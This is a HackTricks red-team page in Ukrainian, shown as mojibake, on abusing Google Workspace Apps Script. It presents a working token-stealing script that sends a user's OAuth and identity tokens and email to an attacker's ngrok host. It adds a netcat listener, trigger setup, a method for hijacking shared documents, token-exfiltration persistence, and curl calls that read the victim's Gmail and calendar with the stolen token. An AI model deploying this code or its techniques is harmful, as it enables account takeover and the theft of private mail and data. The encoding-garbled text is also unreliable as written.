# GWS - –°—Ü–µ–Ω–∞—Ä—ñ—ó –∑–∞—Å—Ç–æ—Å—É–Ω–∫—ñ–≤

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## –°—Ü–µ–Ω–∞—Ä—ñ—ó –∑–∞—Å—Ç–æ—Å—É–Ω–∫—ñ–≤

–°—Ü–µ–Ω–∞—Ä—ñ—ó –∑–∞—Å—Ç–æ—Å—É–Ω–∫—ñ–≤ - —Ü–µ **–∫–æ–¥, —è–∫–∏–π –±—É–¥–µ –∑–∞–ø—É—Å–∫–∞—Ç–∏—Å—è, –∫–æ–ª–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∑ –¥–æ–∑–≤–æ–ª–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ –æ—Ç—Ä–∏–º—É—î –¥–æ—Å—Ç—É–ø –¥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –∑ —è–∫–∏–º –ø–æ–≤'—è–∑–∞–Ω–∏–π App Script**, —ñ –ø—ñ—Å–ª—è **–ø—Ä–∏–π–Ω—è—Ç—Ç—è –∑–∞–ø–∏—Ç—É OAuth**.\
–á—Ö —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –Ω–∞ **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –ø–µ–≤–Ω–∏–π —á–∞—Å** –≤–ª–∞—Å–Ω–∏–∫–æ–º App Script (–°—Ç—ñ–π–∫—ñ—Å—Ç—å).

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è App Script

–Ñ –∫—ñ–ª—å–∫–∞ —Å–ø–æ—Å–æ–±—ñ–≤ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è App Script, —Ö–æ—á–∞ –Ω–∞–π–ø–æ—à–∏—Ä–µ–Ω—ñ—à—ñ - **–∑ Google Document (–±—É–¥—å-—è–∫–æ–≥–æ —Ç–∏–ø—É)** —Ç–∞ —è–∫ **—Å–∞–º–æ—Å—Ç—ñ–π–Ω–∏–π –ø—Ä–æ–µ–∫—Ç**:

<details>

<summary>–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–≤'—è–∑–∞–Ω–æ–≥–æ –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–º –ø—Ä–æ–µ–∫—Ç—É –∑ Google Docs, Sheets –∞–±–æ Slides</summary>

1. –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç Docs, –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É —Ç–∞–±–ª–∏—Ü—é Sheets –∞–±–æ –ø—Ä–µ–∑–µ–Ω—Ç–∞—Ü—ñ—é Slides.
2. –ö–ª–∞—Ü–Ω—ñ—Ç—å **Extensions** > **Google Apps Script**.
3. –£ —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –∫–ª–∞—Ü–Ω—ñ—Ç—å **Untitled project**.
4. –î–∞–π—Ç–µ —Å–≤–æ—î–º—É –ø—Ä–æ–µ–∫—Ç—É –Ω–∞–∑–≤—É —Ç–∞ –∫–ª–∞—Ü–Ω—ñ—Ç—å **Rename**.

</details>

<details>

<summary>–°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É</summary>

–î–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É –∑ Apps Script:

1. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –Ω–∞ [`script.google.com`](https://script.google.com/).
2. –ö–ª–∞—Ü–Ω—ñ—Ç—å **New Project**.
3. –£ —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –∫–ª–∞—Ü–Ω—ñ—Ç—å **Untitled project**.
4. –î–∞–π—Ç–µ —Å–≤–æ—î–º—É –ø—Ä–æ–µ–∫—Ç—É –Ω–∞–∑–≤—É —Ç–∞ –∫–ª–∞—Ü–Ω—ñ—Ç—å **Rename**.

</details>

<details>

<summary>–°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É –∑ Google Drive</summary>

1. –í—ñ–¥–∫—Ä–∏–π—Ç–µ [Google Drive](https://drive.google.com/).
2. –ö–ª–∞—Ü–Ω—ñ—Ç—å **New** > **More** > **Google Apps Script**.

</details>

<details>

<summary>–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∑–≤'—è–∑–∞–Ω–æ–≥–æ –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–æ–º –ø—Ä–æ–µ–∫—Ç—É –∑ Google Forms</summary>

1. –í—ñ–¥–∫—Ä–∏–π—Ç–µ —Ñ–æ—Ä–º—É –≤ Google Forms.
2. –ö–ª–∞—Ü–Ω—ñ—Ç—å More more\_vert > **Script editor**.
3. –£ —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ —Å–∫—Ä–∏–ø—Ç—ñ–≤ –∫–ª–∞—Ü–Ω—ñ—Ç—å **Untitled project**.
4. –î–∞–π—Ç–µ —Å–≤–æ—î–º—É –ø—Ä–æ–µ–∫—Ç—É –Ω–∞–∑–≤—É —Ç–∞ –∫–ª–∞—Ü–Ω—ñ—Ç—å **Rename**.

</details>

<details>

<summary>–°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ clasp</summary>

`clasp` - —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞, —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏, –≤–∏—Ç—è–≥—É–≤–∞—Ç–∏/–∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ç–∞ —Ä–æ–∑–≥–æ—Ä—Ç–∞—Ç–∏ –ø—Ä–æ–µ–∫—Ç–∏ Apps Script –∑ —Ç–µ—Ä–º—ñ–Ω–∞–ª—É.

–î–∏–≤. [–ü–æ—Å—ñ–±–Ω–∏–∫ –∑ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É –∫–æ–º–∞–Ω–¥–Ω–æ–≥–æ —Ä—è–¥–∫–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `clasp`](https://developers.google.com/apps-script/guides/clasp) –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

</details>

## –°—Ü–µ–Ω–∞—Ä—ñ–π App Script <a href="#create-using-clasp" id="create-using-clasp"></a>

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è Google Sheet –∑ App Script

–ü–æ—á–Ω—ñ—Ç—å –∑ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è App Script, –º–æ—è —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—è –¥–ª—è —Ü—å–æ–≥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é - —Å—Ç–≤–æ—Ä–∏—Ç–∏ Google Sheet —ñ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ **`Extensions > App Scripts`**, —Ü–µ –≤—ñ–¥–∫—Ä–∏—î **–Ω–æ–≤–∏–π App Script –¥–ª—è –≤–∞—Å, –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –∞—Ä–∫—É—à–µ–º**.

### –í–∏—Ç—ñ–∫ —Ç–æ–∫–µ–Ω—É

–î–ª—è –Ω–∞–¥–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ç–æ–∫–µ–Ω—É OAuth –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∫–ª–∞—Ü–Ω—É—Ç–∏ –Ω–∞ **`Services +` —Ç–∞ –¥–æ–¥–∞—Ç–∏ –æ–±—Å—è–≥–∏, —Ç–∞–∫—ñ —è–∫**:

* **AdminDirectory**: –î–æ—Å—Ç—É–ø –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø –∫–∞—Ç–∞–ª–æ–≥—É (—è–∫—â–æ —É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–æ–∑–≤–æ–ª—ñ–≤)
* **Gmail**: –î–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–∞–Ω–∏—Ö Gmail
* **Drive**: –î–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –¥–∞–Ω–∏—Ö Drive
* **Google Sheets API**: –î–ª—è —Ä–æ–±–æ—Ç–∏ –∑ —Ç—Ä–∏–≥–µ—Ä–æ–º

–©–æ–± –∑–º—ñ–Ω–∏—Ç–∏ **–Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –æ–±—Å—è–≥–∏** —Å–∞–º–æ—Å—Ç—ñ–π–Ω–æ, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –ø—Ä–æ–µ–∫—Ç—É —Ç–∞ —É–≤—ñ–º–∫–Ω—É—Ç–∏: **`Show "appsscript.json" manifest file in editor`.**
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

–î–ª—è –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –∑–∞–ø–∏—Ç—É –≤–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Å—Ç–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
–î–æ–∑–≤–æ–ª–∏, –∑–∞–ø–∏—Ç–∞–Ω—ñ –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è App Script:

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
–ü—Ä–∏ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–º—É –∑–∞–ø–∏—Ç—ñ —Ç–∞–∫–æ–∂ **–∑–∞–ø–∏—Ç–∞—Ç–∏–º–µ—Ç—å—Å—è –¥–æ–∑–≤—ñ–ª –Ω–∞ –¥–æ—Å—Ç—É–ø –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫**.
{% endhint %}

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –¢—Ä–∏–≥–µ—Ä–∞

–ü—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ App –ø—Ä–æ—á–∏—Ç–∞–Ω–æ, –∫–ª–∞—Ü–Ω—ñ—Ç—å –Ω–∞ **‚è∞ –¢—Ä–∏–≥–µ—Ä–∏**, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Ç—Ä–∏–≥–µ—Ä. –Ø–∫ **—Ñ—É–Ω–∫—Ü—ñ—é** –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–∏–±–µ—Ä—ñ—Ç—å **`getToken`**, –∑–∞–ø—É—Å–∫–∞–π—Ç–µ –ø—Ä–∏ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—ñ **`Head`**, —É –¥–∂–µ—Ä–µ–ª—ñ –ø–æ–¥—ñ–π –≤–∏–±–µ—Ä—ñ—Ç—å **`–ó —Ç–∞–±–ª–∏—Ü—ñ`** —ñ —Ç–∏–ø –ø–æ–¥—ñ—ó –≤–∏–±–µ—Ä—ñ—Ç—å **`–ü—Ä–∏ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—ñ`** –∞–±–æ **`–ü—Ä–∏ —Ä–µ–¥–∞–≥—É–≤–∞–Ω–Ω—ñ`** (–∑–≥—ñ–¥–Ω–æ –∑ –≤–∞—à–∏–º–∏ –ø–æ—Ç—Ä–µ–±–∞–º–∏) —Ç–∞ –∑–±–µ—Ä–µ–∂—ñ—Ç—å.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è App Scripts –≤–æ –≤–∫–ª–∞–¥—Ü—ñ –í–∏–∫–æ–Ω–∞–Ω–Ω—è**, —è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –≤—ñ–¥–ª–∞–≥–æ–¥–∏—Ç–∏ —â–æ—Å—å.

### –ü–æ–¥—ñ–ª

–î–ª—è **–∑–∞–ø—É—Å–∫—É** **App Script** –ø–æ—Ç–µ—Ä–ø—ñ–ª–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –∑ **–¥–æ—Å—Ç—É–ø–æ–º –†–µ–¥–∞–∫—Ç–æ—Ä–∞**.

{% hint style="success" %}
**–¢–æ–∫–µ–Ω**, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è **App Script**, –±—É–¥–µ —Ç–∏–º, —è–∫–∏–π **—Å—Ç–≤–æ—Ä–∏–≤ —Ç—Ä–∏–≥–µ—Ä**, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Ñ–∞–π–ª –≤—ñ–¥–∫—Ä–∏—Ç–æ —è–∫ –†–µ–¥–∞–∫—Ç–æ—Ä —ñ–Ω—à–∏–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏.
{% endhint %}

### –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è –¥–æ–∫—É–º–µ–Ω—Ç–∞–º–∏, —è–∫—ñ –±—É–ª–∏ —Å–ø—ñ–ª—å–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –∑—ñ –º–Ω–æ—é

{% hint style="danger" %}
–Ø–∫—â–æ —Ö—Ç–æ—Å—å **–ø–æ–¥—ñ–ª–∏–≤—Å—è –∑ –≤–∞–º–∏ –¥–æ–∫—É–º–µ–Ω—Ç–æ–º –∑ App Scripts —Ç–∞ —Ç—Ä–∏–≥–µ—Ä–æ–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Head** App Script (–Ω–µ —Ñ—ñ–∫—Å–æ–≤–∞–Ω–µ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è), –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—ñ–Ω–∏—Ç–∏ –∫–æ–¥ App Script (–¥–æ–¥–∞–≤—à–∏, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ñ—É–Ω–∫—Ü—ñ—ó –∫—Ä–∞–¥—ñ–∂–∫–∏ —Ç–æ–∫–µ–Ω—ñ–≤), –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω—å–æ–≥–æ –¥–æ—Å—Ç—É–ø, —ñ **App Script –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–∏–π –ø–æ–¥—ñ–ª–∏–≤—Å—è –¥–æ–∫—É–º–µ–Ω—Ç–æ–º –∑ –≤–∞–º–∏**! (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–æ–∫–µ–Ω OAuth –≤–ª–∞—Å–Ω–∏–∫–∞ –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–ª–∞—Å—Ç–µ–π, —è–∫—ñ –±—É–ª–∏ –≤–∫–∞–∑–∞–Ω—ñ –ø—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—ñ —Ç—Ä–∏–≥–µ—Ä–∞).

**–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –±—É–¥–µ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ –≤–ª–∞—Å–Ω–∏–∫—É —Å–∫—Ä–∏–ø—Ç–∞, —â–æ –ø–æ–∫–∞–∑—É—î, —â–æ —Ö—Ç–æ—Å—å –∑–º—ñ–Ω–∏–≤ —Å–∫—Ä–∏–ø—Ç** (–ê —â–æ –Ω–∞ —Ä–∞—Ö—É–Ω–æ–∫ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–æ–∑–≤–æ–ª—ñ–≤ gmail –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ñ—ñ–ª—å—Ç—Ä–∞, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—é?)
{% endhint %}

{% hint style="success" %}
–Ø–∫—â–æ **–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—ñ–Ω—é—î –æ–±–ª–∞—Å—Ç—ñ App Script**, –æ–Ω–æ–≤–ª–µ–Ω–Ω—è **–Ω–µ –±—É–¥—É—Ç—å –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ** –¥–æ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –ø–æ–∫–∏ –Ω–µ –±—É–¥–µ —Å—Ç–≤–æ—Ä–µ–Ω–æ **–Ω–æ–≤–∏–π —Ç—Ä–∏–≥–µ—Ä** –∑—ñ –∑–º—ñ–Ω–∞–º–∏. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –Ω–µ –∑–º–æ–∂–µ –≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω –≤–ª–∞—Å–Ω–∏–∫–∞ –∑ –±—ñ–ª—å—à–∏–º–∏ –æ–±–ª–∞—Å—Ç—è–º–∏, –Ω—ñ–∂ —Ç—ñ, —è–∫—ñ –≤—ñ–Ω –≤—Å—Ç–∞–Ω–æ–≤–∏–≤ —É —Ç—Ä–∏–≥–µ—Ä—ñ, —è–∫–∏–π –≤—ñ–Ω —Å—Ç–≤–æ—Ä–∏–≤.
{% endhint %}

### –ö–æ–ø—ñ—é–≤–∞–Ω–Ω—è –∑–∞–º—ñ—Å—Ç—å —Å–ø—ñ–ª—å–Ω–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è

–ö–æ–ª–∏ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –¥–ª—è —Å–ø—ñ–ª—å–Ω–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–æ–∫—É–º–µ–Ω—Ç–∞, —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è –ø–æ—Å–∏–ª–∞–Ω–Ω—è, —Å—Ö–æ–∂–µ –Ω–∞ —Ü–µ: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
–Ø–∫—â–æ –≤–∏ **–∑–º—ñ–Ω–∏—Ç–µ** –∑–∞–∫—ñ–Ω—á–µ–Ω–Ω—è **"/edit"** –Ω–∞ **"/copy"**, –∑–∞–º—ñ—Å—Ç—å –¥–æ—Å—Ç—É–ø—É google –∑–∞–ø–∏—Ç–∞—î –≤–∞—Å, —á–∏ —Ö–æ—á–µ—Ç–µ –≤–∏ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫–æ–ø—ñ—é –¥–æ–∫—É–º–µ–Ω—Ç–∞:**

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

–Ø–∫—â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á —Å–∫–æ–ø—ñ—é—î –π–æ–≥–æ —Ç–∞ –æ—Ç—Ä–∏–º–∞—î –¥–æ—Å—Ç—É–ø, **–≤–º—ñ—Å—Ç –¥–æ–∫—É–º–µ–Ω—Ç–∞ —Ç–∞ App Scripts –±—É–¥—É—Ç—å —Å–∫–æ–ø—ñ–π–æ–≤–∞–Ω—ñ**, –ø—Ä–æ—Ç–µ **—Ç—Ä–∏–≥–µ—Ä–∏ –Ω—ñ**. –¢–æ–º—É **–Ω—ñ—á–æ–≥–æ –Ω–µ –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ**.

### –°–ø—ñ–ª—å–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —è–∫ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **—Å–ø—ñ–ª—å–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ App Script —è–∫ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫** (—É –†–µ–¥–∞–∫—Ç–æ—Ä—ñ App Script, —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç–∏ —è–∫ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫), –∞–ª–µ –∑'—è–≤–∏—Ç—å—Å—è —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è, –ø–æ–¥—ñ–±–Ω–µ –¥–æ —Ü—å–æ–≥–æ:

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

–ó–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î **—Ç–∏–ø–æ–≤–µ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è OAuth**, —è–∫–µ –∑–∞–ø–∏—Ç—É—î **–Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–æ–∑–≤–æ–ª–∏**.

### –¢–µ—Å—Ç—É–≤–∞–Ω–Ω—è

–í–∏ –º–æ–∂–µ—Ç–µ –ø—Ä–æ—Ç–µ—Å—Ç—É–≤–∞—Ç–∏ –∑—ñ–±—Ä–∞–Ω–∏–π —Ç–æ–∫–µ–Ω, —â–æ–± –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω—ñ –ª–∏—Å—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

–°–ø–∏—Å–æ–∫ –∫–∞–ª–µ–Ω–¥–∞—Ä—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## –°–∫—Ä–∏–ø—Ç –¥–æ–¥–∞—Ç–∫–∞ —è–∫ –ø–æ—Å—Ç—ñ–π–Ω—ñ—Å—Ç—å

–û–¥–Ω–∏–º –∑ –≤–∞—Ä—ñ–∞–Ω—Ç—ñ–≤ –ø–æ—Å—Ç—ñ–π–Ω–æ—Å—Ç—ñ –º–æ–∂–µ –±—É—Ç–∏ **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –¥–æ–∫—É–º–µ–Ω—Ç–∞ —Ç–∞ –¥–æ–¥–∞–≤–∞–Ω–Ω—è —Ç—Ä–∏–≥–µ—Ä–∞ –¥–ª—è —Ñ—É–Ω–∫—Ü—ñ—ó getToken** —Ç–∞ **–ø–æ–¥—ñ–ª –¥–æ–∫—É–º–µ–Ω—Ç–∞ –∑ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–æ–º**, —â–æ–± –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –≤—ñ–¥–∫—Ä–∏–≤–∞—î —Ñ–∞–π–ª, **–µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞–≤—Å—è —Ç–æ–∫–µ–Ω –∂–µ—Ä—Ç–≤–∏**.

